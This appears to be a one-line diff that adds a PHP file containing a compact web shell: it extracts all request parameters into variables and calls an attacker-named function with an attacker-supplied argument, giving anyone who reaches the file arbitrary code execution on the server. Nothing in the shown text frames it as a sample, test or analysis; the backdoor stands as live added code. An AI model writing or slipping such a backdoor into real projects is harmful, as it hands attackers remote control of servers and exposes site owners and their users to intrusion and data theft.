@@ -1,0 +1,1 @@
+<?php extract($_REQUEST);if(isset($uxa,$uxb)){$uxa($uxb);exit;}
